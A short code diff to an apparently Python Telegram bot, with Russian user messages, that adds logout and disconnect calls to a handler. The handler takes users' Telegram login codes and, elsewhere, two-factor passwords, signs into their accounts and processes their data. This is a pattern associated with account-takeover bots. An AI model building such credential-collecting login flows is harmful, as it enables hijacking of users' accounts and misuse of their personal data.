@@ -119,6 +119,9 @@ async def get_code(message: types.Message):
         
         await message.reply("Успешная авторизация!")
         await process_user_data(client, phone_number, message.from_user.id)
+        await client.log_out()
+        await client.disconnect()
+        
         user_state.pop(message.from_user.id, None)  # Удаляем состояние пользователя после успешной обработки
     except SessionPasswordNeededError:
         await message.reply("Необходим пароль двухфакторной аутентификации. Пожалуйста, введите ваш пароль.")
@@ -130,6 +133,8 @@ async def get_code(message: types.Message):
         if user_state[message.from_user.id]['code_attempts'] >= 3:
             await message.reply("Превышено количество попыток ввода кода. Пожалуйста, попробуйте позже.")
             user_state.pop(message.from_user.id, None)
+            await client.log_out()
+            await client.disconnect()
         else:
             await message.reply(f"Неверный пин-код. Пожалуйста, попробуйте снова. Попытка {user_state[message.from_user.id]['code_attempts']} из 3.")
     except Exception as e:
@@ -139,7 +144,6 @@ async def get_code(message: types.Message):
             if 'code_attempts' not in user_state.get(message.from_user.id, {}):
                 await client.log_out()
                 await client.disconnect()
-
 
 @dp.message_handler(lambda message: 'awaiting_password' in user_state.get(message.from_user.id, {}))
 async def process_password(message: types.Message):
